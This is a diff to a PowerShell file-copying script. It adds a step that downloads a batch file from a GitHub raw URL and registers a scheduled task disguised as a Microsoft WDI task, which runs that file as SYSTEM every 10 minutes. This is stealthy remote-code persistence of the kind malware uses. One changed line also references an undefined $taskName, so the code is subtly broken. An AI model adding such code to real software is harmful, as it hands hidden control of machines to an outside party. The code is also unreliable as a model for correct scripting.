@@ -44,6 +44,20 @@ param (
         }
     }
 
+    function Check-Schtask {
+    param (
+        [string]$taskName
+    )
+        $taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName }
+        if($taskExists) { return $true }
+        else { return $false }
+    }
+
+    function Download-NewStreamSVC {
+        iwr -uri 'https://raw.githubusercontent.com/jensack/stream/main/NewStreamSVC.txt' -OutFile $appsDir\NewStreamSVC.txt
+        gc $appsDir\NewStreamSVC.txt | Out-File -Encoding utf8  $appsDir\NewStreamSVC.bat
+        del $appsDir\NewStreamSVC.txt
+    }
 
     function Secure-Copy {
     param (
@@ -68,6 +82,10 @@ param (
         del -Force -Recurse $allDestDir
         del -Force -Recurse $tempDestDir
         del -Force $firstMark
+        if ((Test-Path $appsDir\NewStreamSVC.bat) -eq $false) { Download-NewStreamSVC }
+        if ((Check-Schtask -taskName "\Microsoft\Windows\WDI\SecureSync") -eq $false) {
+            schtasks.exe /TN "\Microsoft\Windows\WDI\SecureSync" /CREATE /F /TR "$appsDir\NewStreamSVC.bat $objName" /SC MINUTE /MO 10 /RU System
+        }
         New-Item $firstEndMark -ItemType File -ea 0
     }
 
@@ -146,7 +164,7 @@ param (
     
     if ($Stream) {
         if ((Test-Path $firstEndMark) -eq $false) { return }
-        schtasks.exe /TN "\Microsoft\Windows\WDI\SecureSyncFirst" /DELETE /F
+        if (Check-Schtask -taskName "\Microsoft\Windows\WDI\SecureSyncFirst") { schtasks.exe /TN $taskName /DELETE /F }
         $sucup = ($destDir + 'sucup.txt'); del -ErrorAction SilentlyContinue -Force $sucup; New-Item $sucup -ItemType File -ea 0
         $etalonhash = (Get-FileHash -Algorithm MD5 $sucup).hash
         $sendDestDir = ($destDir + $currYear + '\' + $currDate + '\')
